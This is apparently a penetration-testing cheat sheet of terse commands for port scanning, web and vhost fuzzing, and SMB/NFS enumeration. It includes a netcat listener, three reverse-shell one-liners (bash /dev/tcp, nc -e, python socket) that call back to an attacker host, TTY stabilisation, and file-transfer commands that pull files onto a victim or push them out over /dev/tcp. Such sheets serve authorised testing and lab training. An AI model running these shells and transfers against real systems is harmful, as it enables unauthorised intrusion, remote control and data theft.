🔍 Recon & Scanning

nmap -sC -sV -oN nmap.txt $IP      # default scripts + versions
nmap -p- --min-rate 5000 $IP      # all TCP ports fast
nmap -sU --top-ports 50 $IP       # top UDP
rustscan -a $IP -- -sCV           # fast port discovery

Web directory / vhost

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
gobuster dir -u http://$IP -w wl.txt -x php,txt,html
ffuf -u http://$IP -H "Host: FUZZ.target" -w subs.txt -fs 0   # vhost

Service enum

enum4linux -a $IP                 # SMB
smbclient -L //$IP/ -N            # list shares (null)
showmount -e $IP                  # NFS exports
whatweb http://$IP                # web fingerprint

nc -lvnp $LPORT                   # or: rlwrap nc -lvnp $LPORT

sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1
nc $LHOST $LPORT -e /bin/sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

Stabilize the TTY

python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then on your box:
stty raw -echo; fg
# back in shell:
export TERM=xterm; stty rows 50 cols 200

📡 File Transfer

# Attacker serves:
python3 -m http.server 80
# Victim pulls:
wget http://$LHOST/file ; curl -O http://$LHOST/file
# No tools? /dev/tcp:
cat file > /dev/tcp/$LHOST/$LPORT   # nc -lvnp on attacker
# Base64 paste:
base64 -w0 file   # copy → base64 -d > file
